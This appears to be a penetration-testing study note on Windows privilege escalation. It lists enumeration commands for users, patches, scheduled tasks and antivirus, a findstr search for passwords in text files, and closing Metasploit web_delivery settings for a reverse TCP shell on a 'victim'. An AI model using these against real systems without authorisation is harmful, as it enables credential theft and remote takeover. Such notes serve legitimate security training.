## User Enumeration
The following commands will help us enumerate users and their privileges on the target system.

Current user’s privileges: `whoami /priv`

List users: `net users`

List details of a user: `net user username` (e.g. `net user Administrator`)

Other users logged in simultaneously: `qwinsta` (the `query session` command can be used the same way) 

User groups defined on the system: `net localgroup`

List members of a specific group: `net localgroup groupname` (e.g. `net localgroup Administrators`)

collecting system information
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

## Searching Files
The `findstr` command can be used to find such files in a format similar to the one given below:
`findstr /si password *.txt`

 Command breakdown:
`findstr`: Searches for patterns of text in files.
`/si`: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)
`password`: The command will search for the string “password” in files
`*.txt`: The search will cover files that have a .txt extension

## Patch Level
Microsoft regularly releases updates and patches for Windows systems. A missing critical patch on the target system can be an easily exploitable ticket to privilege escalation. The command below can be used to list updates installed on the target system.
`wmic qfe get Caption,Description,HotFixID,InstalledOn`

## Network Connection
The netstat command can be used to list all listening ports on the target system. The `netstat -ano`
-   `-a`: Displays all active connections and listening ports on the target system.
-   `-n`: Prevents name resolution. IP Addresses and ports are displayed with numbers instead of attempting to resolves names using DNS.
-   `-o`: Displays the process ID using each listed connection

## Scheduled Tasks
Some tasks may be scheduled to run at predefined times. If they run with a privileged account (e.g. the System Administrator account) and the executable they run can be modified by the current user you have, an easy path for privilege escalation can be available.

The `schtasks` command can be used to query scheduled tasks.

`schtasks /query /fo LIST /v`

## Drivers
The `driverquery` command will list drivers installed on the target system.

## Anti Virus
The first approach may require some research beforehand to learn more about service names used by the antivirus software. For example, the default antivirus installed on Windows systems, Windows Defender’s service name is windefend. The query below will search for a service named “windefend” and return its current state.

`sc query windefend`

 While the second approach will allow you to detect antivirus software without prior knowledge about its service name, the output may be overwhelming.

`sc queryex type=service`



Metasploit: multi/script/web_delivery
- set TARGET PSH\ (Binary) <- this is for powershell
- set payload windows/shell/reverse_tcp
- set PSH-EncodedCommand false

This module will create a script. Need to move that over to the windows victim. Need access to machine to get this to work.